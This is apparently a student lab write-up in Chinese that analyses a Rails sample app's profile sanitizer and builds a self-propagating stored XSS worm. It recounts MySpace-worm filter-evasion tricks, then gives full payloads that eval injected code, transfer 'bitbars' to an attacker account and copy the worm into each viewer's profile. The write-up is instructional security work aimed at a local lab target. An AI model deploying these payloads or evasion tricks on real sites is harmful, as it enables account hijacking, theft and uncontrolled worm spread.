`http://localhost:3000/profile?username=x`，其中 x 是查看的用户。

网页允许使用 HTML 一个子集，MySpace 漏洞可能对本任务有启发。

### 漏洞分析

查看 profile 相关源码：

profile 的初始化：

`login_controller..rb`

```ruby
def post_register
    username = params[:username]
    password = params[:password]
    
    @error = ""
    if username == "" or password == ""
      @error = "You must enter a username and password."
    elsif User.find_by_username(username)
      @error = "A user with that name already exists"
    end
    
    if @error != ""
      render :register_form
    elsif
      @user = User.new
      @user.username = username
      @user.salt = generate_random_salt
      @user.hashed_password = hash_password(password, @user.salt)
      @user.profile = ""
      @user.bitbars = 200
      @user.save
      session[:logged_in_id] = @user.id
      load_logged_in_user
      render :register_success
    end
  end
```

注册完用户之后，用户的 profile 被初始化为空。

`user_controller.rb`

```ruby
  def set_profile
    if not logged_in?
      render "main/must_login"
      return
    end
    
    @logged_in_user.profile = params[:new_profile]
    @logged_in_user.save
    
    render :set_profile_success
  end
```

用户设置 profile 后，将输入框的内容作为 profile。

```shell
  def view_profile
    @username = params[:username]
    @user = User.find_by_username(@username)
    if not @user
      if @username and @username != ""
        @error = "User #{@username} not found"
      elsif logged_in?
        @user = @logged_in_user
      end
    end
    
    render :profile
  end
```

用户查看 profile 时，使用 `render :profile` 渲染页面

`profile.html.erb`

```html
    <% if @user.profile and @user.profile != "" %>
        <div id="profile"><%= sanitize_profile(@user.profile) %></div>
    <% end %>
```

渲染 profile 时，调用 sanitize_profile 对 profile 进行清洗：

`application_helper.rb`

```ruby
  def sanitize_profile(profile)
    return sanitize(profile, tags: %w(a br b h1 h2 h3 h4 i img li ol p strong table tr td th u ul em span), attributes: %w(id class href colspan rowspan src align valign))
  end
```

可以看到允许的标签和属性。

下面从技术层面上介绍一下 MySpace 蠕虫病毒：

- MySpace 拦截了大量的 tags，仅仅允许 `<a>, <img>s, and <div>s...`，不允许 `<script>s, <body>s, onClicks, onAnythings, href's with javascript, etc...`。然而，一些浏览器（IE, some versions of Safari, others）允许 CSS 标签中有 javascript 代码。比如

  ```html
  <div style="background:url('javascript:alert(1)')">
  ```

- 这样的话，不能在 div 标签中使用 `"` ，因为已经使用过了 `'` 和 `"`，为了解决这个问题，用一个表达式储存 JS 然后用名字执行。比如：

  ```html
  <div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
  ```

- 现在可以用单引号写 JS 代码了。然而 MySpace 会从任何地方删除 javascirpt 字符串，一些浏览器会将 `java\nscript` 解析为 `javascript`，比如：

  ```html
  <div id="mycode" expr="alert('hah!')" style="background:url('java
  script:eval(document.all.mycode.expr)')">
  ```

- 尽管可以使用单引号，有时也需要使用双引号。只需要将双引号转义即可，但是 MySpace 会删除所有转义字符，那么可以将十进制转换为 ASCII 码用来产生双引号。比如：

  ```html
  <div id="mycode" expr="alert('double quote: ' + String.fromCharCode(34))" style="background:url('java
  script:eval(document.all.mycode.expr)')">
  ```

- 为了向正在查看网页的用户发送代码，需要获取网页的源代码。可以使用 `document.body.innerHTML` 获取网页源代码。MySpace 会删除 innerHTML 单词，可以通过分割字符串的方法绕过这一点，比如：

  ```html
  alert(eval('document.body.inne' + 'rHTML'));
  ```

- 现在来访问其他页面，可以使用 iframe，但是 iframe 通常来说没有那么有用并且加载过于明显。所以使用 ajax(xml-http)来进行 GETs 和 POSTs 请求，然而，MySpace 会删除 onreadystatechange，同样的可以使用分割字符串绕过，比如：

  ```html
  eval('xmlhttp.onread' + 'ystatechange = callback');
  ```

- 等等，后续的内容对本任务没有那么重要。

 ### 攻击原理

受 MySpace 漏洞的启发，可以使用 CSS 标签内嵌 JS 代码的方式绕过 Rails 的标签过滤。

回顾一下允许的标签和属性：

```ruby
 def sanitize_profile(profile)
    return sanitize(profile, tags: %w(a br b h1 h2 h3 h4 i img li ol p strong table tr td th u ul em span), attributes: %w(id class href colspan rowspan src align valign))
  end
```

官方文档：

> ### **sanitize**(html, options = {})[Link](https://edgeapi.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize)
>
> Sanitizes HTML input, stripping all but known-safe tags and attributes.
>
> It also strips href/src attributes with unsafe protocols like `javascript:`, while also protecting against attempts to use Unicode, ASCII, and hex character references to work around these protocol filters. All special characters will be escaped.
>
> The default sanitizer is Rails::Html::SafeListSanitizer. See [Rails HTML Sanitizers](https://github.com/rails/rails-html-sanitizer) for more information.
>
> Custom sanitization rules can also be provided.
>
> Please note that sanitizing user-provided text does not guarantee that the resulting markup is valid or even well-formed.

可以看到 sanitize 同时去除了href 和 src 内嵌不安全的协议，比如 `javascirpt`，以及尝试使用 ASCII 的方法。

但是，这个 sanitize 存在漏洞，参考 [Rails sanitize allowed_attributes 不安全 · Ruby China (ruby-china.org)](https://ruby-china.org/topics/28760)，结合源代码：

`profile.html.erb`

```html
    <span id="bitbar_count" class="<%= @user.bitbars %>" />
    <script type="text/javascript">
      var total = eval(document.getElementById('bitbar_count').className);
      function showBitbars(bitbars) {
        document.getElementById("bitbar_display").innerHTML = bitbars + " bitbars";
        if (bitbars < total) {
          setTimeout("showBitbars(" + (bitbars + 1) + ")", 20);
        }
      }
```

可以看到关键代码：

```js
var total = eval(document.getElementById('bitbar_count').className);
```

这一行通过 bitbar_count 寻找页面元素并计算 class 的值，如果页面中多个元素的 id 相同，该方法只会返回第一个匹配的元素。巧的是，profile 的内容正好在原 bitbar_count 的上面，那么就可以利用这一点，设置 profile 的元素的 id 为 bitbar_count，class 存放 JS 代码，那么就可以实现执行任意代码。例如：

```html
<a id= "bitbar_count" class="alert(1)">way</a> 
```

首先执行转账操作，向 post_transfer 发送 post 请求即可：

```js
const params = "destination_username=attacker&quantity=1";
var req = new XMLHttpRequest();
req.withCredentials=true;
req.open('POST', 'http://localhost:3000/post_transfer');
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
try { req.send(params); }
finally {
    req = new XMLHttpRequest();
    ...
}
```

转账完成后，更新当前用户的 profile，经过上面的源码分析，向 set_profile 发送 post 请求即可：

```js
req = new XMLHttpRequest();
req.withCredentials=true;
req.open('POST', 'http://localhost:3000/set_profile');
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
new_profile="new_profile=".concat(document.all.profile.innerHTML);
req.send(new_profile);
```

最终的代码：

```html
<a id= "bitbar_count" class="eval(document.all.mycode.innerHTML)">way</a>
<a id= "mycode">
    const params = "destination_username=attacker&quantity=1";
    var req = new XMLHttpRequest();
    req.withCredentials=true;
    req.open('POST', 'http://localhost:3000/post_transfer');
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    try { req.send(params); }
    finally {
        req = new XMLHttpRequest();
        req.withCredentials=true;
        req.open('POST', 'http://localhost:3000/set_profile');
        req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        new_profile="new_profile=".concat(document.all.profile.innerHTML);
        req.send(new_profile);
    }
</a>
```

设置 attacker 的 profile ，然后登录 user1 账户查看 attacker 的 profile：

发现 `&` 被转义为了 `amp;`，可以使用 `String.fromCharCode(38)` 来解决这个问题。修改后的代码：

```html
<a id= "bitbar_count" class="eval(document.all.mycode.innerHTML)">way</a>
<a id= "mycode">
    const params = "destination_username=attacker".concat(String.fromCharCode(38)).concat("quantity=1");
    var req = new XMLHttpRequest();
    req.withCredentials=true;
    req.open('POST', 'http://localhost:3000/post_transfer');
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    try { req.send(params); }
    finally {
        req = new XMLHttpRequest();
        req.withCredentials=true;
        req.open('POST', 'http://localhost:3000/set_profile');
        req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        new_profile="new_profile=".concat(document.all.profile.innerHTML);
        req.send(new_profile);
    }
</a>
```

执行之前的账户信息：

![image-20220506153207436](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506153207436.png)

修改 attacker 的 profile，使用 user1 访问 attacker 的 profile：

访问后的账户信息：

![image-20220506153221591](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506153221591.png)

登录 user2 访问 user1 的 profile：

![image-20220506153320844](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506153320844.png)

发现 user2 的 profile 被修改：

![image-20220506153346625](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506153346625.png)

同时转账成功：

![image-20220506153406081](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506153406081.png)
